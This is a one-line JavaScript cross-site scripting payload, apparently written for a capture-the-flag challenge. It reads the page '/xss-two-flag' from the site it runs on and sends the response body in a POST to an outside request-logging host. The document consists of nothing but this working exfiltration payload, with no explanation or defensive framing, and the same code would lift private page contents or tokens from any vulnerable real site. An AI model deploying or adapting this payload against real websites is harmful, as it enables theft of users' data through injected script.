fetch('/xss-two-flag').then(res =>res.text()).then(data=>fetch("http://au6jet4q.requestrepo.com/",{method:"POST",mode:"no-cors",body:data
}))
